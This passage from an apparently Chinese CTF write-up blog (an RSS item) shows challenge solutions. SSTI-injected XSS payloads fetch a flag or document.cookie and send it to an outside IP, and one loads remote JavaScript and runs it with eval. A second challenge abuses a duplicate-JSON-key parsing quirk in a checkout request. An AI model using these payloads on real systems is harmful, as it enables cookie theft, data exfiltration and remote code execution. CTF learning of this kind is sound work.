&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">=&amp;gt;&lt;/span>&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://27.25.151.48:12138/?q=&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">,{&lt;/span>&lt;span class="s1">&amp;#39;no-cors&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>那么修改一下&lt;code>payload&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{fetch(&amp;#39;http://27.25.151.48:12138/index.js&amp;#39;).then(t=&amp;gt;t.text()).then(eval)}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是这样子的话，我在想怎么处理回显的问题，怎么去看呢，后来交流知道了要不直接在&lt;code>SSTI&lt;/code>里面插入&lt;code>xss&lt;/code>来打&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">{{eval(&amp;#39;document.location=\&amp;#34;http://27.25.151.48:9999/?a=\&amp;#34;+document.cookie&amp;#39;)}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>那么拿到&lt;code>cookie&lt;/code>登录即可&lt;/p>
&lt;h2 id="ezoldbuddy">ezoldbuddy
&lt;/h2>&lt;p>nginx解析问题，当有重复键的时候，会有解析的问题，从而导致了漏洞&lt;/p>
&lt;p>不同的后端会有不同的解析，这里的话是后面的覆盖前面的&lt;/p>
&lt;p>借用师傅的包&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">POST /shopbytedancesdhjkf/cart/checkout HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 113.201.14.253:38180
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 49
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Type: application/json
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: */*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Origin: http://113.201.14.253:61868
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Referer: http://113.201.14.253:61868/shopbytedancesdhjkf%E2%80%A6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate, br
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,mg;q=0.7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: close
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{&amp;#34;orderId&amp;#34;:1,&amp;#34;cart&amp;#34;:[{&amp;#34;id&amp;#34;:9,&amp;#34;qty&amp;#34;:0,&amp;#34;qty&amp;#34;:101}]}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x03-小结">0x03 小结
&lt;/h1>&lt;p>爆零有时候不一定是坏事？！没错学到了(以上题目均为浮现)&lt;/p>
&lt;p>非常感谢给我WP的师傅，虽然有些看不懂(但是一来就看懂了，怎么进步呢)&lt;/p>
&lt;p>非常感谢回答我问题的所有师傅&lt;/p></description></item></channel></rss>